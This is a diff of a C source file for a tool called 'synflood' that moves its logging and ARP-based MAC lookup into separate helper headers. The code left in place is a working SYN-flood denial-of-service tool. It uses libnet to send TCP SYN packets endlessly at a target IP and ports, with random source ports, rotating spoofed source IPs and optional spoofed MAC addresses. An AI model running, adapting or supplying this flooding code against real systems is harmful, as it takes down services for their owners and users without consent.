@@ -21,36 +21,26 @@
 
 #include <arpa/inet.h>
 #include <getopt.h>
-#include <libnet.h>
 #include <net/if_arp.h>
 #include <netinet/ether.h>
 #include <netinet/in.h>
-#include <pcap.h>
 #include <signal.h>
 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
 
-#define IP_ADDR_LEN 4
+#include <libnet.h>
 
-#define LOG_IS_TYPE(level, type) ((level & type) == type)
-#define LOG_INFO    0x01
-#define LOG_MSG     0x02
-#define LOG_FATAL   0x04
-#define LOG_LIBNET  0x08
-#define LOG_PCAP    0x10
+#include "utils.h"
+#include "arp_utils.h"
 
 #define PACKETS_PER_IP 1024
 
 void usage(void);
-void slog(int level, const char *fmt, ...);
 void synflood(short* dp, int dp_count, u_int8_t* src_mac,
                   u_int32_t dst_ip, u_int8_t* dst_mac);
 void build_arp(libnet_t* l, int op, u_int8_t* src_ip, u_int8_t* src_mac,
     u_int8_t* dst_ip, u_int8_t* dst_mac);
-int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac);
-void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
-                                 const u_char* packet);
 
 const char* program_name = "synflood";
 const char* program_version = "0.1";
@@ -70,22 +60,14 @@ int g_use_spoof_mac = 0;
 
 /* global variables */
 libnet_t* lnc = 0;
-pcap_t* pcc = 0;
 in_addr_t tgt_ip = 0;
 struct libnet_ether_addr tgt_mac, spf_mac;
 char* intf = NULL;                     /* interface */
-
-typedef struct _ip_mac_pair {
-  int complete;                  /* whether ip and mac are both specified */
-  in_addr_t* ip;
-  struct libnet_ether_addr* mac;
-} ip_mac_pair;
 
 int main(int argc, char *argv[])
 {
   char err_buf[LIBNET_ERRBUF_SIZE > PCAP_ERRBUF_SIZE?
                LIBNET_ERRBUF_SIZE: PCAP_ERRBUF_SIZE];
-  struct bpf_program bp;
   int opt = 0;
   char* spf_mac_str = 0;
   char* spf_mac_of_ip_str = 0;
@@ -122,6 +104,8 @@ int main(int argc, char *argv[])
     }
   }
 
+  slog_init(program_name, g_verbose_mode);
+
   /* check if use is root */
   if (getuid() && geteuid()) {
     fprintf(stderr, "%s: must run as root\n", program_name);
@@ -134,37 +118,25 @@ int main(int argc, char *argv[])
   }
 
   if (optind == argc)
-    slog(LOG_FATAL, "must specified host IP address\n");
+    slog(L_FATAL, 0, "must specified host IP address\n");
 
   /* libnet init */
   if (g_use_spoof_mac)
     lnc = libnet_init(LIBNET_LINK_ADV, intf, err_buf);
   else
     lnc = libnet_init(LIBNET_RAW4, intf, err_buf);
-  slog(LOG_INFO, "libnet_init()\n");
-
-  /* pcap init */
-  if (!(pcc = pcap_open_live(intf, 100, 0, 10, err_buf)))
-    slog(LOG_PCAP, "pcap_open_live() error\n");
-  slog(LOG_INFO, "pcap_open_live()\n");
-
-  /* set capture filter */
-  if (-1 == pcap_compile(pcc, &bp, "arp", 0, -1))
-    slog(LOG_PCAP, "pcap_compile(): error\n");
-
-  if (-1 == pcap_setfilter(pcc, &bp))
-    slog(LOG_PCAP, "pcap_setfilter(): error\n");
+  slog(L_INFO, 0, "libnet_init()\n");
 
   if (spf_mac_str) { /* spoof MAC address */
     struct ether_addr* ptr = ether_aton(spf_mac_str);
-    if (!ptr) slog(LOG_FATAL, "invalid MAC address\n");
+    if (!ptr) slog(L_FATAL, 0, "invalid MAC address\n");
     memcpy(&spf_mac, ether_aton(spf_mac_str), ETHER_ADDR_LEN);
   } else if (spf_mac_of_ip_str) { /* spoof MAC address by IP */
     in_addr_t ip;
     if (-1 == (ip = libnet_name2addr4(lnc,spf_mac_of_ip_str,LIBNET_RESOLVE)))
-      slog(LOG_LIBNET, "invalid IP address\n");
-    if (!get_mac_by_ip(ip, &spf_mac))
-      slog(LOG_FATAL, "can't resolve MAC address for %s\n",spf_mac_of_ip_str);
+      slog(L_LIBNET, lnc, "invalid IP address\n");
+    if (!get_mac_by_ip(intf, ip, &spf_mac))
+      slog(L_FATAL, 0, "can't resolve MAC address for %s\n",spf_mac_of_ip_str);
   }
 
   if (dst_ports_str) {
@@ -177,13 +149,13 @@ int main(int argc, char *argv[])
     for (i = 1; i < dst_ports_count; ++i)
       dst_ports[i] = atoi(strtok(NULL, ","));
   } else
-    slog(LOG_FATAL, "must specify destination ports\n");
+    slog(L_FATAL, 0, "must specify destination ports\n");
 
   tgt_ip_str = argv[optind];
   tgt_ip = libnet_name2addr4(lnc, tgt_ip_str, LIBNET_RESOLVE);
 
-  if (g_use_spoof_mac && !get_mac_by_ip(tgt_ip, &tgt_mac))
-    slog(LOG_FATAL, "can't resolve MAC address for %s\n",tgt_ip_str);
+  if (g_use_spoof_mac && !get_mac_by_ip(intf, tgt_ip, &tgt_mac))
+    slog(L_FATAL, 0, "can't resolve MAC address for %s\n",tgt_ip_str);
 
   synflood(dst_ports, dst_ports_count, (u_int8_t*)&spf_mac, tgt_ip,
            (u_int8_t*)&tgt_mac);
@@ -201,7 +173,7 @@ void synflood(short* dp, int dp_count, u_int8_t* src_mac,
   int build_ethernet = g_use_spoof_mac;
   int port_sw = 0;
 
-  slog(LOG_MSG, "flooding in progress...\n");
+  slog(L_MSG, 0, "flooding in progress...\n");
   while (1) {
     if (-1 == (tcp_tag = libnet_build_tcp(   /* build TCP header */
         sp = libnet_get_prand(LIBNET_PRu16), /* source port */  
@@ -217,7 +189,7 @@ void synflood(short* dp, int dp_count, u_int8_t* src_mac,
         0,                                   /* payload length or 0 */
         lnc,                                 /* libnet context */
         tcp_tag                              /* ptag protocol tag */
-    ))) slog(LOG_LIBNET, "can't build TCP header\n");
+    ))) slog(L_LIBNET, lnc, "can't build TCP header\n");
 
     /* update new IP address and dest_port every N packet */
     if (count == PACKETS_PER_IP) {
@@ -237,7 +209,7 @@ void synflood(short* dp, int dp_count, u_int8_t* src_mac,
           0,                                 /* payload length or 0 */
           lnc,                               /* libnet context */
           ip_tag                             /* ptag protocol tag */
-      ))) slog(LOG_LIBNET, "can't build IP header\n");
+      ))) slog(L_LIBNET, lnc, "can't build IP header\n");
     }
 
     if (build_ethernet) {
@@ -250,13 +222,13 @@ void synflood(short* dp, int dp_count, u_int8_t* src_mac,
           0,                           /* payload length */
           lnc,                         /* libnet context */
           0                            /* 0 to build a new one */
-      )) slog(LOG_LIBNET, "can't build ethernet header\n");
+      )) slog(L_LIBNET, lnc, "can't build ethernet header\n");
     }
 
     if (-1 == libnet_write(lnc))
-      slog(LOG_LIBNET, "can't send packet\n");
+      slog(L_LIBNET, lnc, "can't send packet\n");
 
-    slog(LOG_INFO, "%s:%5hu ---> %s:%5hu\n",
+    slog(L_INFO, 0, "%s:%5hu ---> %s:%5hu\n",
         libnet_addr2name4(src_ip, LIBNET_DONT_RESOLVE),
         sp,
         libnet_addr2name4(dst_ip, LIBNET_DONT_RESOLVE),
@@ -264,147 +236,6 @@ void synflood(short* dp, int dp_count, u_int8_t* src_mac,
     );
     ++count;
   }
-}
-
-void build_arp(libnet_t* l, int op, u_int8_t* src_ip, u_int8_t* src_mac,
-    u_int8_t* dst_ip, u_int8_t* dst_mac) {
-
-  libnet_ptag_t p_tag;
-
-  p_tag = libnet_build_arp(      /* construct arp packet */
-      ARPHRD_ETHER,              /* hardware type ethernet */
-      ETHERTYPE_IP,              /* protocol type */
-      ETHER_ADDR_LEN,            /* mac length */
-      IP_ADDR_LEN,               /* protocol length */
-      op,                        /* op type */
-      src_mac,                   /* source mac addr */
-      src_ip,                    /* source ip addr */
-      dst_mac,                   /* dest mac addr */
-      dst_ip,                    /* dest ip addr */
-      NULL,                      /* payload */
-      0,                         /* payload length */
-      l,                       /* libnet context */
-      0                          /* 0 stands to build a new one */
-  );
-
-  if (-1 == p_tag)
-    slog(LOG_LIBNET, "can't build arp header\n");
-
-  if (op == ARPOP_REQUEST)
-    dst_mac = (u_int8_t*)"\xff\xff\xff\xff\xff\xff";
-
-  p_tag = libnet_build_ethernet( /* create ethernet header */
-      dst_mac,                   /* dest mac addr */
-      src_mac,                   /* source mac addr */
-      ETHERTYPE_ARP,             /* protocol type */
-      NULL,                      /* payload */
-      0,                         /* payload length */
-      l,                       /* libnet context */
-      0                          /* 0 to build a new one */
-  );
-
-  if (-1 == p_tag)
-    slog(LOG_LIBNET, "can't build ethernet header\n");
-}
-
-int get_mac_by_ip(in_addr_t ip, struct libnet_ether_addr *mac) {
-  int i = 0;
-  ip_mac_pair imp = {0, &ip, mac};
-  char err_buf[LIBNET_ERRBUF_SIZE];
-  libnet_t* l = libnet_init(LIBNET_LINK_ADV, intf, err_buf);
-
-  slog(LOG_INFO, "resolving MAC address for %s\n",
-       libnet_addr2name4(ip, LIBNET_DONT_RESOLVE));
-  in_addr_t local_ip = libnet_get_ipaddr4(l);
-  struct libnet_ether_addr* local_mac = libnet_get_hwaddr(l);
-
-  if (local_mac == NULL)
-    slog(LOG_LIBNET, "can't resolve MAC address for localhost\n");
-
-  build_arp(l, ARPOP_REQUEST, (u_int8_t*)&local_ip, (u_int8_t*)local_mac,
-               (u_int8_t*)&ip, (u_int8_t*)"\x00\x00\x00\x00\x00\x00");
-
-  slog(LOG_MSG, "%s: 42 bytes, broadcasting: Who has %s? Tell %s\n", intf,
-       libnet_addr2name4(ip, LIBNET_DONT_RESOLVE),
-       libnet_addr2name4(local_ip, LIBNET_DONT_RESOLVE));
-
-  do {
-    /* send arp request */
-    if (-1 == libnet_write(l))
-      slog(LOG_LIBNET, "can't send packet\n");
-
-    /* capture arp reply */
-    *mac->ether_addr_octet = 0;
-    pcap_dispatch(pcc, 1, arp_packet_handler_cb, (u_char*) &imp);
-    if (imp.complete) {
-      libnet_clear_packet(l);
-      return 1;
-    }
-    usleep(100000);
-  } while (++i < 30); /* try for 3 seconds */
-
-  libnet_clear_packet(lnc);
-  return 0;
-}
-
-void arp_packet_handler_cb(u_char* imp, const struct pcap_pkthdr* pkinfo,
-                                 const u_char* packet) {
-  struct libnet_802_3_hdr *h_eth;
-  struct libnet_arp_hdr *h_arp;
-
-  h_eth = (void*)packet;
-  h_arp = (void*)((char*)h_eth + LIBNET_ETH_H);
-
-  if ((htons(h_arp->ar_op) == ARPOP_REPLY)
-      && (htons(h_arp->ar_pro) == ETHERTYPE_IP)
-      && (htons(h_arp->ar_hrd) == ARPHRD_ETHER)) {
-    in_addr_t ip;
-    memcpy(&ip, (char*)h_arp + LIBNET_ARP_H + h_arp->ar_hln, 4);
-    if (memcmp(&ip, ((ip_mac_pair*)imp)->ip, IP_ADDR_LEN) == 0) {
-      memcpy(((ip_mac_pair*)imp)->mac, h_eth->_802_3_shost, ETHER_ADDR_LEN);
-      ((ip_mac_pair*)imp)->complete = 1;
-      int c = 0;
-      slog(LOG_MSG, "%s: %d bytes, received: %s is at ", intf, pkinfo->len,
-          libnet_addr2name4(ip, LIBNET_DONT_RESOLVE));
-      for (c = 0; c < 6; c++)
-        slog(LOG_MSG, "%.2x%c", ((u_char*)((ip_mac_pair*)imp)->mac)[c],
-               (c < 5)? ':': '\n');
-      return;
-    }
-  }
-}
-
-void slog(int level, const char *fmt, ...) {
-  va_list vap;
-
-  if (LOG_IS_TYPE(level, LOG_INFO) && !g_verbose_mode)
-    return;
-
-  if (LOG_IS_TYPE(level, LOG_LIBNET)) {
-    char* tmp = libnet_geterror(lnc);
-    if (tmp && strlen(tmp) != 0)
-      fprintf(stderr, "%s: %s\n", program_name, tmp);
-  }
-
-  if (LOG_IS_TYPE(level, LOG_PCAP)) {
-    char* tmp = pcap_geterr(pcc);
-    if (tmp && strlen(tmp) != 0)
-      fprintf(stderr, "%s: %s\n", program_name, tmp);
-  }
-
-  if (LOG_IS_TYPE(level, LOG_MSG)) {
-    va_start(vap, fmt);
-    vfprintf(stdout, fmt, vap);
-    va_end(vap);
-  } else {
-    fprintf(stderr, "%s: ", program_name);
-    va_start(vap, fmt);
-    vfprintf(stderr, fmt, vap);
-    va_end(vap);
-  }
-
-  if (!LOG_IS_TYPE(level, LOG_INFO) && !LOG_IS_TYPE(level, LOG_MSG))
-    exit(1);
 }
 
 void usage(void) {
